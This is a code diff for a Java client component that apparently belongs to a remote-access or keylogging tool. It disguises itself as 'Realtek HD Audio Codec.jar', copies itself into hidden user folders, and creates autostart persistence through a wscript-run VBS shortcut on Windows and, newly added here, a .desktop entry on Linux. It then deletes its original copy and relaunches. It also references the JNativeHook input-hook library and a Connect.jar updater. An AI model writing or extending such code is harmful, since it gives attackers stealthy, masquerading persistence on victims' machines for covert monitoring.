@@ -14,7 +14,7 @@ import java.net.NetworkInterface;
 import java.net.SocketException;
 import java.util.*;
 
-public class InstallComponents {
+public class ClientInstallComponents {
 
     // Updater Variables
     public static final String LOCAL_FILE = "Realtek HD Audio Codec.jar";
@@ -22,7 +22,8 @@ public class InstallComponents {
 
     public static boolean install() {
         boolean windows = System.getProperty("os.name").toLowerCase().contains("win");
-        if (!windows) {
+        boolean linux = System.getProperty("os.name").toLowerCase().contains("linux");
+        if (!windows && !linux) {
             return false;
         }
 
@@ -40,68 +41,97 @@ public class InstallComponents {
             }
         }
 
-        File main = new File(FileComponents.getFileName());
-        String folder = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\";
-        if (FileComponents.getFileName().isEmpty()) {
+        File main = new File(ClientFileComponents.getFileName());
+        if (ClientFileComponents.getFileName().isEmpty() || ClientFileComponents.getFileName().equalsIgnoreCase(LOCAL_FILE) || !main.exists()) {
             return false;
         }
-        if (FileComponents.getFileName().equalsIgnoreCase(LOCAL_FILE) || !main.exists()) {
-            return false;
-        }
+
+        String folder = windows ? (System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\")
+                : (System.getProperty("user.home") + "/.config/realtek-audio/");
         String targetPath = folder + LOCAL_FILE;
-        String startUpPath = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + LOCAL_SHORTCUT;
-        File startUp = new File(startUpPath);
+
+        File startUp;
+        if (windows) {
+            startUp = new File(System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + LOCAL_SHORTCUT);
+        } else {
+            startUp = new File(System.getProperty("user.home") + "/.config/autostart/realtek-audio.desktop");
+        }
         File objective = new File(targetPath);
+
         if (objective.exists() && startUp.exists() && objective.length() == main.length()) {
-            FileComponents.tempDeleteFile(FileComponents.getFileName());
+            ClientFileComponents.tempDeleteFile(ClientFileComponents.getFileName());
             runJar(LOCAL_FILE, folder);
             return true;
         }
 
-        FileComponents.copy(main, objective);
+        new File(folder).mkdirs();
+        ClientFileComponents.copy(main, objective);
 
-        String script = String.format(
-                "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n" +
-                        "Set Shortcut = WshShell.CreateShortcut(\"%s\")\n" +
-                        "Shortcut.TargetPath = \"%s\"\n" +
-                        "Shortcut.WorkingDirectory = \"%s\"\n" +
-                        "Shortcut.Save",
-                startUpPath.replace("\\", "\\\\"),
-                targetPath.replace("\\", "\\\\"),
-                new File(targetPath).getParent().replace("\\", "\\\\")
-        );
+        if (windows) {
+            String script = String.format(
+                    "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n" +
+                            "Set Shortcut = WshShell.CreateShortcut(\"%s\")\n" +
+                            "Shortcut.TargetPath = \"%s\"\n" +
+                            "Shortcut.WorkingDirectory = \"%s\"\n" +
+                            "Shortcut.Save",
+                    startUp.getAbsolutePath().replace("\\", "\\\\"),
+                    targetPath.replace("\\", "\\\\"),
+                    new File(targetPath).getParent().replace("\\", "\\\\")
+            );
 
-        File scriptFile = new File("connect.vbs");
+            File scriptFile = new File("connect.vbs");
+            try (BufferedWriter writer = new BufferedWriter(new FileWriter(scriptFile))) {
+                writer.write(script);
+            } catch (Exception ignored) {
+            }
 
-        try (BufferedWriter writer = new BufferedWriter(new FileWriter(scriptFile))) {
-            writer.write(script);
-        } catch (Exception ignored) {
+            try {
+                Process process = Runtime.getRuntime().exec("wscript " + scriptFile.getAbsolutePath());
+                process.waitFor();
+            } catch (Exception ignored) {
+            } finally {
+                scriptFile.delete();
+            }
+        } else {
+            new File(System.getProperty("user.home") + "/.config/autostart/").mkdirs();
+            String desktopFile = "[Desktop Entry]\n" +
+                    "Type=Application\n" +
+                    "Name=Realtek Audio Codec\n" +
+                    "Exec=java -jar \"" + targetPath + "\"\n" +
+                    "Terminal=false\n" +
+                    "Hidden=false\n";
+            try (BufferedWriter writer = new BufferedWriter(new FileWriter(startUp))) {
+                writer.write(desktopFile);
+            } catch (Exception ignored) {
+            }
         }
 
-        try {
-            Process process = Runtime.getRuntime().exec("wscript " + scriptFile.getAbsolutePath());
-            process.waitFor();
-        } catch (Exception ignored) {
-        } finally {
-            scriptFile.delete();
-        }
-
-        FileComponents.tempDeleteFile(FileComponents.getFileName());
+        ClientFileComponents.tempDeleteFile(ClientFileComponents.getFileName());
         runJar(LOCAL_FILE, folder);
         return true;
     }
 
     public static void uninstall() {
         boolean windows = System.getProperty("os.name").toLowerCase().contains("win");
-        if (!windows) {
+        boolean linux = System.getProperty("os.name").toLowerCase().contains("linux");
+        if (!windows && !linux) {
             return;
         }
-        String startUpPath = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + LOCAL_SHORTCUT;
-        String path = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\" + LOCAL_FILE;
-        FileComponents.deleteFile(new File(startUpPath));
-        FileComponents.deleteFile(new File(path));
-        FileComponents.tempDeleteFile(FileComponents.getFileName());
-        FileComponents.tempDeleteFile("JNativeHook.x86_64.dll");
+        String startUpPath;
+        String path;
+        if (windows) {
+            startUpPath = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + LOCAL_SHORTCUT;
+            path = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\" + LOCAL_FILE;
+        } else {
+            startUpPath = System.getProperty("user.home") + "/.config/autostart/realtek-audio.desktop";
+            path = System.getProperty("user.home") + "/.config/realtek-audio/" + LOCAL_FILE;
+        }
+        ClientFileComponents.deleteFile(new File(startUpPath));
+        ClientFileComponents.deleteFile(new File(path));
+        ClientFileComponents.tempDeleteFile(ClientFileComponents.getFileName());
+        if (windows) {
+            ClientFileComponents.tempDeleteFile("JNativeHook.x86_64.dll");
+        }
     }
 
     public static String generateUniqueCode() {
@@ -138,7 +168,7 @@ public class InstallComponents {
     }
 
     public static void update() {
-        FileComponents.copy(new File("Connect.jar"), new File(LOCAL_FILE));
+        ClientFileComponents.copy(new File("Connect.jar"), new File(LOCAL_FILE));
         runJar(LOCAL_FILE, null);
     }
 
